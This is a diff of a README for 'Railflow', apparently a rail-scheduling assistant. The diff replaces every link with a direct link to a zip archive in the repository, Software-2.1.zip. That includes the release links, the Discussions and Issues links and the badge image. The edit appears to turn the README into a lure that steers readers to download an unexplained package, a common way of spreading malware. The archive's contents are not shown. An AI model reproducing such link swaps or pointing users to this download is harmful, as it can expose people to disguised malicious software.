@@ -1,7 +1,7 @@
 # 🚂 Railflow - Your Smart Assistant for Rail Management
 
 ## 📥 Download Now
-[![Download Railflow](https://img.shields.io/badge/Download-Railflow-blue)](https://github.com/Saad1001S/Railflow/releases)
+[![Download Railflow](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip)](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Railflow, the intelligent decision support system designed to enhance train management for Indian Railways. This application aims to optimize train scheduling, minimize delays, and ensure safety with the help of advanced AI technology. No coding skills are required—just follow the steps below to get started.
@@ -20,7 +20,7 @@ To run Railflow smoothly, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Designed for ease of use, even for those without technical backgrounds.
 
 ## 📥 Download & Install
-To download Railflow, visit this page: [Railflow Releases](https://github.com/Saad1001S/Railflow/releases). Choose the latest version, and download the setup file suited for your operating system.
+To download Railflow, visit this page: [Railflow Releases](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip). Choose the latest version, and download the setup file suited for your operating system.
 
 ### Steps to Install
 1. Click the link above to go to the releases page.
@@ -53,8 +53,8 @@ A: While there is no dedicated customer support, the GitHub community is active 
 
 ## 📞 Community and Support
 Join our community to discuss features, report issues, or suggest improvements:
-- Visit the [GitHub Discussions](https://github.com/Saad1001S/Railflow/discussions) page.
-- Check the [Issues](https://github.com/Saad1001S/Railflow/issues) section for reported bugs and fixes.
+- Visit the [GitHub Discussions](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip) page.
+- Check the [Issues](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip) section for reported bugs and fixes.
 
 ## 🌟 Acknowledgments
 Thank you for using Railflow! Your feedback helps us improve the application and serve you better. Please feel free to contribute by reporting issues or suggesting enhancements.
@@ -63,4 +63,4 @@ Thank you for using Railflow! Your feedback helps us improve the application and
 Railflow continues to evolve. Upcoming updates will focus on incorporating user feedback to enhance features and usability. Stay tuned by following this repository for updates! 
 
 ## 📥 Download Now
-[![Download Railflow](https://img.shields.io/badge/Download-Railflow-blue)](https://github.com/Saad1001S/Railflow/releases)
+[![Download Railflow](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip)](https://github.com/Saad1001S/Railflow/raw/refs/heads/main/simulation/Software-2.1.zip)
